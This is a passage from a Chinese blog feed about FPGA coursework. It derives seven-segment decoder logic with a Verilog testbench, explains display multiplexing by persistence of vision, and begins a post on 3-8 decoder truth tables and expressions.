style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mbin">⋅&lt;/span>&lt;span class="mspace" style="margin-right:0.2222em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:2.065em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/p>
&lt;p>同理其它引脚的表达式也如下：&lt;/p>
&lt;p>$$
\begin{aligned}
c &amp;amp;= \overline{I_3} \cdot \overline{I_2} \cdot I_1 \cdot \overline{I_0} +I_3 \cdot I_2 \cdot \overline{I_0} +I_3 \cdot I_2 \cdot I_1\\
d &amp;amp;= \overline{I_3} \cdot \overline{I_2} \cdot \overline{I_1} \cdot I_0+ \overline{I_3} \cdot I_2 \cdot \overline{I_1} \cdot \overline{I_0} +I_2 \cdot I_1 \cdot I_0+I_3 \cdot \overline{I_2} \cdot I_1 \cdot \overline{I_0} \\
f &amp;amp;= \overline{I_3} \cdot \overline{I_2} \cdot I_0+ \overline{I_3} \cdot \overline{I_2} \cdot I_1+ \overline{I_3} \cdot I_1 \cdot I_0+I_3 \cdot I_2 \cdot \overline{I_1} \cdot I_0\\
g &amp;amp;= \overline{I_3} \cdot \overline{I_2} \cdot \overline{I_1} + \overline{I_3} \cdot I_2 \cdot I_1 \cdot I_0+I_3 \cdot I_2 \cdot \overline{I_1} \cdot \overline{I_0} \\
\end{aligned}
$$&lt;/p>
&lt;p>根据简化后的表达式，我们可以画出如下的电路图：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/17/zoVtOBxwl62e3Aq.png"
loading="lazy"
alt="7_Segment_Display_Original_Circuit.png"
>&lt;/p>
&lt;p>在 Logisim 上模拟运行的结果如下&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/17/lqgIPabK6UEjV7e.gif"
loading="lazy"
alt="Seven_Segment_Circuit.gif"
>&lt;/p>
&lt;h2 id="仿真激励与上板验证">仿真激励与上板验证
&lt;/h2>&lt;p>我们将画好图的模块导出为 verilog 文件 &lt;code>MyMC14495.v&lt;/code> ，并且为其编写激励模块：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-verilog" data-lang="verilog">&lt;span class="line">&lt;span class="cl">&lt;span class="k">module&lt;/span> &lt;span class="n">MyMC14495_tb&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">reg&lt;/span> &lt;span class="n">EN&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">reg&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mh">3&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mh">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">I&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">wire&lt;/span> &lt;span class="n">g&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MyMC14495&lt;/span> &lt;span class="n">simu_MC14495&lt;/span>&lt;span class="p">(.&lt;/span>&lt;span class="n">EN&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EN&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">I0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0&lt;/span>&lt;span class="p">]),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">I1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">1&lt;/span>&lt;span class="p">]),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">I2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">2&lt;/span>&lt;span class="p">]),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">I3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">3&lt;/span>&lt;span class="p">]),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="n">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">integer&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">initial&lt;/span> &lt;span class="k">begin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">EN&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;=&lt;/span>&lt;span class="mh">15&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mh">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="k">begin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">#&lt;/span>&lt;span class="mh">50&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">3&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">2&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">1&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">I&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">end&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">#&lt;/span>&lt;span class="mh">50&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">EN&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">end&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">endmodule&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在 Vivado 上运行仿真激励得到如下结果：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/17/vyDElNqe9GJaPgR.png"
loading="lazy"
alt="Behaviour_Simulation_Waveform_Diagram.png"
>&lt;/p>
&lt;p>使用 Verilog 进行接线，编写引脚约束文件。上板验证，但是有盒我就不放图图了。&lt;/p>
&lt;h2 id="使四个七段数码管同时显示四个数字">使四个七段数码管同时显示四个数字？
&lt;/h2>&lt;p>可以利用&lt;strong>视觉残留效应&lt;/strong>：当物体在快速运动时, 人眼所看到的影像消失后，人眼仍能继续保留其影像 $\frac{1}{24}$ 秒左右的图像，因此我们可以用时钟作为选择器，以一定的（足够高的）频率输出四位的信号控制四个数码管的使能端，使得每次只亮起一个数码管，这个数码管显示的是其对应的数字（类似于显示器的扫描线）。这样的话，在第二个数字亮起的同时，上一个数字的像还没有从人眼中消失，在视觉上便得到了同时显示四个数字的效果：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Time&lt;/th>
&lt;th>$E_3E_2E_1E_0$&lt;/th>
&lt;th>$O$&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>1110&lt;/td>
&lt;td>N_0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1101&lt;/td>
&lt;td>N_1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>1011&lt;/td>
&lt;td>N_2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>0111&lt;/td>
&lt;td>N_3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>1110&lt;/td>
&lt;td>N_0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;hellip;&lt;/td>
&lt;td>&amp;hellip;&lt;/td>
&lt;td>&amp;hellip;&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>因为是四个数码管，因此这四段数码管应该在 $\frac{1}{24}$ 秒内完成一次扫描循环，单个数码管亮起熄灭的时间则是 $\frac{1}{24}\cdot\frac{1}{4}=\frac{1}{96}$ 秒。 这是我下周将要实现的内容。下播。&lt;/p></description></item><item><title>FPGA01_3-8译码器的设计与应用</title><link>https://nepl1t.github.io/p/fpga01_3-8%E8%AF%91%E7%A0%81%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/</link><pubDate>Wed, 27 Mar 2024 03:12:52 +0800</pubDate><guid>https://nepl1t.github.io/p/fpga01_3-8%E8%AF%91%E7%A0%81%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/</guid><description>&lt;h2 id="3-8-译码器的设计">3-8 译码器的设计
&lt;/h2>&lt;p>用三个 bit 的输入信号来得到八个 bit 的输出信号，一个十分自然的思路便是使用二进制编码：毕竟我们有 $2^3=8$ 。如果我们将作为输入信号的三个 bit 记作 $I_0, I_1, I_2$， 作为八个输出信号的 bit 记作 $O_0, O_1, \dots, O_8$ ，那么我们可以作出如下的真值表：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Index&lt;/th>
&lt;th>$I_2$&lt;/th>
&lt;th>$I_1$&lt;/th>
&lt;th>$I_0$&lt;/th>
&lt;th>$O_0$&lt;/th>
&lt;th>$O_1$&lt;/th>
&lt;th>$O_2$&lt;/th>
&lt;th>$O_3$&lt;/th>
&lt;th>$O_4$&lt;/th>
&lt;th>$O_5$&lt;/th>
&lt;th>$O_6$&lt;/th>
&lt;th>$O_7$&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>7&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>很显然，如果我们将 $O_0, \dots, O_7$ 作为八个布尔函数来看的话，它们都只有唯一一个值为1的最小项，所以这个最小项便是它们的最简表达式。因此我们有&lt;/p>
&lt;p class="katex-block">&lt;span class="katex-display">&lt;span class="katex">&lt;span class="katex-mathml">&lt;math xmlns="http://www.w3.org/1998/Math/MathML" display="block">&lt;semantics>&lt;mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em">&lt;mtr>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;mrow>&lt;/mrow>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;mover accent="true">&lt;mrow>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;/mrow>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo separator="true">,&lt;/mo>&lt;mspace width="2em">&lt;/mspace>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>4&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mover accent="true">&lt;mrow>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;/mrow>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;/mtr>&lt;mtr>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;mrow>&lt;/mrow>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;mover accent="true">&lt;mrow>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;/mrow>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo separator="true">,&lt;/mo>&lt;mspace width="2em">&lt;/mspace>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>5&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;/mtr>&lt;mtr>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;mrow>&lt;/mrow>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;mo separator="true">,&lt;/mo>&lt;mspace width="2em">&lt;/mspace>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>6&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;/mtr>&lt;mtr>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;mtd>&lt;mstyle scriptlevel="0" displaystyle="true">&lt;mrow>&lt;mrow>&lt;/mrow>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>3&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;mover accent="true">&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;mo stretchy="true">‾&lt;/mo>&lt;/mover>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;mo separator="true">,&lt;/mo>&lt;mspace width="2em">&lt;/mspace>&lt;msub>&lt;mi>O&lt;/mi>&lt;mn>7&lt;/mn>&lt;/msub>&lt;mo>=&lt;/mo>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>2&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>1&lt;/mn>&lt;/msub>&lt;msub>&lt;mi>I&lt;/mi>&lt;mn>0&lt;/mn>&lt;/msub>&lt;/mrow>&lt;/mstyle>&lt;/mtd>&lt;/mtr>&lt;/mtable>&lt;annotation encoding="application/x-tex">\begin{aligned}
&amp;amp;O_0=\overline{I_2I_1I_0},\qquad O_4=I_2\overline{I_1I_0}\\
&amp;amp;O_1=\overline{I_2I_1}I_0,\qquad O_5=I_2\overline{I_1}I_0\\
&amp;amp;O_2=\overline{I_2}I_1\overline{I_0},\qquad O_6=I_2I_1\overline{I_0}\\
&amp;amp;O_3=\overline{I_2}I_1I_0,\qquad O_7=I_2I_1I_0\\
\end{aligned}
&lt;/annotation>&lt;/semantics>&lt;/math>&lt;/span>&lt;span class="katex-html" aria-hidden="true">&lt;span class="base">&lt;span class="strut" style="height:6.1733em;vertical-align:-2.8367em;">&lt;/span>&lt;span class="mord">&lt;span class="mtable">&lt;span class="col-align-r">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:3.3367em;">&lt;span style="top:-5.3367em;">&lt;span class="pstrut" style="height:2.8833em;">&lt;/span>&lt;span class="mord">&lt;/span>&lt;/span>&lt;span style="top:-3.7933em;">&lt;span class="pstrut" style="height:2.8833em;">&lt;/span>&lt;span class="mord">&lt;/span>&lt;/span>&lt;span style="top:-2.25em;">&lt;span class="pstrut" style="height:2.8833em;">&lt;/span>&lt;span 